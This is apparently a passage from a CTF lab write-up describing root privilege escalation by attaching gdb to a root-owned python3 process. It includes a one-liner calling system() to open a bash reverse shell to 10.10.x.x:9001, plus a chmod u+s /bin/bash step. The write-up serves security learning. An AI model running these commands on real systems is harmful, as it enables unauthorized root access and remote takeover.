For Root:  
  

`export PID=$(ps aux | grep "^root.*python3" | awk '{print $2}')`

`gdb -p $PID`

`call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/9001 0>&1'")`


## Post-Exploitation: Root

As always, when stuck we run linpeas.sh to get an overview of the system. There are files that belong to root and can be read by 'developer', because he is in the 'debug' group.

![](https://vato.cc/content/images/2022/07/linpeas_result.png)

gdb belong to root, but can be read by current user 

To exploit this, we need to find a process that runs as root and attach the gdb instance to that specific process (here: PID 706).

![](https://vato.cc/content/images/2022/07/gdb_1.png)

attach gdb to PID 706

Look up how to call random process from within gdb:

![](https://vato.cc/content/images/2022/07/gdb_2.png)

calling chmod u+s /bin/bash